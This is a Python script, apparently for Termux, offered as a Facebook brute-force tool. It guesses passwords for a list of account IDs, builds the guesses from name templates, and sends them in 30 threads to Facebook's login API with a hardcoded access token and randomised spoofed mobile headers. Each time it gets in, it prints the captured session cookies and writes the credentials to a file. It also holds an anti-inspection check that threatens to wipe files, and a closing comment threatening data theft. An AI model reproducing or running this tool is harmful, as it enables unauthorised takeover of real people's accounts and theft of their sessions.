#WRITTEN BY MR.DIPTO
#FOLLOW MY GITHUB : https://github.com/MR-DIPTO-404
#----------import----------#
import os
from os import system as sm
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
import base64
import requests
import time
os.system("clear")
print("\033[1;33m...CHECKING UPDATES....")
os.system("git pull")
slp(5)
def bypass():
  file = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r')
  file2 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r')
  file3 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r')
  data = file.read()
  sess = file2.read()
  approve = file3.read()
  keyword =("print(url)")
  keyword2 = ("print(data)")
  if keyword in data or "echo" in data or "pprint" in data:
    sm('clear')
    print(10*"\n\033[1;31mBYPASS???? HAHAHAHAHAHAHA NOOB")
    print("\n\033[1;33mBYE BYE FILES AHAHAHHAHA")
    exit()
  elif keyword in sess or "echo" in sess or keyword2 in sess or "pprint" in sess:
    sm('clear')
    print(20*"\nCAPTURE DATA????? NOOB KID")
    print("\n\033[1;31mBYE BYE FILES")
    exit()
  else:
    main()
#----------logo----------#
logo=('''\033[1;36m 
█▀ █░█ █ █▄▀ █   █▀▄▀█ ▄▀█ █▀▀ █░█ █ █▄░█ ▄▀█
▄█ █▀█ █ █░█ █   █░▀░█ █▀█ █▄▄ █▀█ █ █░▀█ █▀█
      ''')
#----------clear----------#
xy = requests.get('https://api.ipify.org/').text
os.system('clear')
print('\r\r\r\33[1;36m              YOUR IP:\33[1;36m'+str(xy))
time.sleep(5)
def clear():
    os.system('clear')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
    print(" ║  \033[1;35mFACE\033[ BOOK BRUTEFORCE 1.0.0       \033[1;36m║")
    print("\033[1;96m ╠═════════════════════════════════╣")
    print(" \033[1;36m║  \033[1;35mFB:\033[1;32m SHIKI MACHINA              \033[1;36m║")
    print(" \033[1;36m║  \033[1;35mSTATUS:\033[1;32m PRIVATE                \033[1;36m║")
    print("\033[1;36m ║  \033[1;35m◉:\033[1;32m EXIT                        \033[1;36m║")
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
#----------line----------#
def line():
    print(42*'\033[1;36m═')
#----------menu----------#
def gffs(ids):
    get_ffs = requests.get("https://jahsbsbs--andrewvista2005.repl.co/ffs.php?chat="+str(ids)).json()
    ffs = get_ffs['followers']
    return ffs
def main():
    clear()
    print(' [1] FILE CLONING ')
    print(' [0] EXIT ')
    line()
    try:
        option=input(' [??] CHOICE MENU : ')
        if option in ['1','01']:
            __file__()
        else:
            exit(' THANKS FOR USING ')
    except ValueError:
        option = "A"
#----------file----------#
def __file__():
    clear()
    filex=input(' [??] ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');slp(2)
        __file__()
    except IsADirectoryError:
        print("\033[1;31mERROR!! THIS IS A FOLDER NOT A FILE!!")
        slp(3)
        __file__()
    clear()
    print("\r\033[1;36m CHOOSE METHOD\n\n [1] METHOD 1(GLOBE & TM)\n [2] METHOD 2(SMART & TNT)")
    line()
    mthd = input('Select Method: ')
    clear()
    try:
        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as death:
        tl=str(len(fo))
        clear()
        print(' TOTAL ACCOUNT : '+tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            if mthd == "1":
                death.submit(m1,ids,names,passlist)
            elif mthd == "2":
                death.submit(m2,ids,names,passlist)
            else:
                main()
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [Shiki~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_US', 
              'client_country_code': 'US', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'{str(uuid.uuid4()).replace("-","")}'
              
            }
            build=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            fbbb=random.randint(100000000,300000000)
            headers={
                    'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; 404: Not Found Build/{build}) [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}'+';[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/201616056;FBCR/TM;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]',
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
              'X-FB-Net-HNI': str(random.randint(10000,99999)), 
              'X-FB-SIM-HNI': str(random.randint(10000,99999)), 
              'X-FB-Connection-Type': 'MOBILE.LTE',
              'X-Tigon-Is-Retry': 'False',
              'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
              'x-fb-device-group': str(random.randint(1000,9999)),
              'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
              'X-FB-Request-Analytics-Tags': 'graphservice', 
              'X-FB-HTTP-Engine': 'Liger', 
              'X-FB-Client-IP': 'True', 
              'X-FB-Server-Cluster': 'True', 
              'x-fb-connection-token': str(uuid.uuid4()).replace('-','')  
              
            }
            url='https://graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                print('\r\r \033[1;33m[FB-LINK]\033[1;34m https://www.facebook.com/'+ids)
                print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                open('/sdcard/Shiki-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
def m2(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [Shiki~ M2] %s| \033[1;32mOk\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_US', 
              'client_country_code': 'US', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'{str(uuid.uuid4()).replace("-","")}'
              
            }
            build=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(10,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            fbbb = random.randint(200000000,300000000)
            fbob = random.randint(200000000,300000000)
            headers={
                    'User-Agent': f"'[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]',"+f"'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,12)}; 404: Not Found Build/{build}) "+"[FBAN/MessengerLite;FBAV/322.0.0.2.140;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/121510535;FBCR/SMART;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2006C3MG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]'",
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
              'X-FB-Net-HNI': str(random.randint(10000,99999)), 
              'X-FB-SIM-HNI': str(random.randint(10000,99999)), 
              'X-FB-Connection-Type': 'MOBILE.LTE',
              'X-Tigon-Is-Retry': 'False',
              'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
              'x-fb-device-group': str(random.randint(1000,9999)),
              'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
              'X-FB-Request-Analytics-Tags': 'graphservice', 
              'X-FB-HTTP-Engine': 'Liger', 
              'X-FB-Client-IP': 'True', 
              'X-FB-Server-Cluster': 'True', 
              'x-fb-connection-token': str(uuid.uuid4()).replace('-','')  
              
            }
            url='https://graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                print('\r\r \033[1;33m[FB-LINK] \033[1;34mhttps://www.facebook.com/'+ids)
                print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                open('/sdcard/Shiki-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
      
#--end--
bypass()
#if you copy this code i stole your data 
